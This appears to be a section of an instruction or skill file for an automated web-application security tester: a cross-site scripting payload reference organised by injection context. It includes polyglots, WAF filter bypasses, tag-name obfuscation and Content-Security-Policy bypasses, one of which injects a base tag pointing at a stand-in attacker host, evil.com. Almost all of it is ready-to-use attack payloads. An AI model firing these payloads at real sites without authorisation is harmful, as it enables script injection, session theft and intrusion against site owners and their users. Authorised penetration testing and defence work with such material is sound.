### Attribute context (unquoted)
Just add a space and the event handler:
```
 onfocus=alert(1) autofocus
/onfocus=alert(1)/autofocus/
 onmouseover=alert(1)
```

### JavaScript string context (inside "..." or '...')
Close the string, run code, comment out the rest:
```
';alert(1);//
";alert(1);//
\\\\';alert(1);//
</script><script>alert(1)</script>
';alert(1)//<!--
```

### JavaScript code context (no surrounding quotes)
Inject directly as an expression:
```
alert(1)
(alert)(1)
[].constructor.constructor("alert(1)")()
top["al"+"ert"](1)
window["al"+"ert"](1)
```

### URL context (href, src, action, formaction)
```
javascript:alert(1)
JaVaScRiPt:alert(1)
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### CSS context (inside <style> or style="...")
```
</style><script>alert(1)</script>
expression(alert(1))            (legacy IE only)
@import "javascript:alert(1)";  (legacy IE only)
background:url("javascript:alert(1)")
```

### DOM-fragment context (location.hash, location.search)
The fragment never reaches the server -- it must be set client-side (browser address bar or window.open):
```
#<img src=x onerror=alert(1)>
#javascript:alert(1)
?q=<img src=x onerror=alert(1)>
```

### Polyglots (try when context is unknown or you only get one shot)

Brute Logic polyglot (works across HTML, JS, attribute, URL contexts):
```
jaVasCript:/*-/*`/*\\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

Compact polyglot:
```
"><svg/onload=alert()>
```

Ultra-short (when length-limited):
```
<svg onload=alert(1)>
```

### Filter / WAF bypass quick reference

| Technique | Example | Use when |
|-----------|---------|----------|
| URL-encode | `%3Cscript%3Ealert(1)%3C/script%3E` | `<` or `>` blocked literally |
| Double URL-encode | `%253Cscript%253E` | Single-decode WAF |
| HTML entity | `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;` | Reflection inside HTML decoder |
| Unicode escape (JS) | `\\\\u003cscript\\\\u003ealert(1)\\\\u003c/script\\\\u003e` | JS context only |
| Case variation | `<ScRiPt>alert(1)</ScRiPt>` | Case-sensitive WAF |
| Null byte | `<scri\\x00pt>alert(1)</scri\\x00pt>` | Legacy parsing |
| Comment break | `<scr<!--x-->ipt>alert(1)</scr<!--x-->ipt>` | Keyword filters |
| Tag soup escape | `</textarea><svg onload=alert(1)>` | Reflection inside `<textarea>` |
| Closing-context escape | `</title><svg onload=alert(1)>` | Reflection inside `<title>` |
| `javascript:` schema variants | `JaVaScRiPt:`, `java\\tscript:`, `java\\nscript:` | URL filter blocks lowercase |
| String concat (no quotes) | `top[/al/.source+/ert/.source](1)` | Quote-stripping filter |
| Backtick template (no quotes) | `` setTimeout`alert\\x281\\x29` `` | Quote-stripping filter |

### Tag-name obfuscation (bypassing tag allowlists / blacklists)

When a filter strips tags by NAME, the browser parser is more permissive than the filter's regex -- one of these families usually slips through. Do NOT pick from memory; SWEEP them against the target (Step 3c) and read what survives-and-fires:

| Family | Examples | Why it slips past |
|--------|----------|-------------------|
| Legacy / alias tags | `<image>` (parses as img), `<listing>`, `<xmp>`, `<plaintext>` | Filter blocklists the modern name; parser maps the alias to the real element |
| Namespaced (SVG / MathML) | `<svg><animate onbegin=alert(1)>`, `<math><mtext>`, `<svg><set onbegin=alert(1)>` | Namespaced parsing differs from flat HTML allowlists |
| Case / spacing | `<ImG>`, `<SvG>`, tag with a leading control char | Case-sensitive or exact-name filters miss the variant |
| Malformed / unclosed | `<svg onload=alert(1)<`, `<img src=x onerror=alert(1)//` | Lenient parser still builds the element; a strict regex does not match |
| Slash-separated (no whitespace) | `<svg/onload=alert(1)>`, `<img/src=x/onerror=alert(1)>` | `/` separates attributes, so a whitespace-stripping filter can't break the tag |
| Unknown / custom element | `<xyz autofocus onfocus=alert(1)>` — **replace the name's FIRST char with one your Step 3c.0 boundary probe PROVED survives; never copy a literal starter. Keep that char DIRECTLY after `<` — whitespace/separators after `<` bypass many filters but some engines mis-parse or throw on them, so verify any such variant end-to-end and never assume it equals a clean starter.** | Filter blocklists real tag NAMES, or a *range* of starter characters; the parser still builds any `<letter…>` as a custom element that honors global `autofocus`/`onfocus` -- no real-tag wordlist contains this form |

The last row doubles as the whitespace-filter bypass: if spaces are removed from your input, join attributes with `/` instead.

### CSP bypass shortcuts

When the response has a `Content-Security-Policy` header, parse it FIRST:

| CSP weakness | Bypass |
|--------------|--------|
| `script-src 'unsafe-inline'` | Direct `<script>alert(1)</script>` works |
| `script-src 'unsafe-eval'` | `eval`, `new Function`, `setTimeout(string)` work |
| `script-src 'self'` (and you have file upload) | Upload `x.js` containing `alert(1)`, then `<script src=/uploads/x.js>` |
| `script-src https://www.google.com ...` (JSONP allowed) | `<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)">` |
| `script-src 'nonce-XYZ'` (nonce reused or in HTML) | Extract nonce from page source, reuse: `<script nonce=XYZ>alert(1)</script>` |
| Angular detected (`ng-app`) | Template injection: `{{constructor.constructor('alert(1)')()}}` |
| Vue detected | Template injection: `{{_c.constructor('alert(1)')()}}` |
| AngularJS detected | `{{$on.constructor('alert(1)')()}}` |
| `default-src 'none'` and no script-src | Often misses `<base>` tag -- inject `<base href=//evil.com>` to redirect script loads |
| Missing `frame-ancestors` | Frame the page from your origin and use postMessage attack |

If CSP is `default-src 'none'; script-src 'none'` AND no upload, AND no JSONP, AND no template engine -- you're stuck. Document the CSP as the primary control and report XSS as defended.
"""
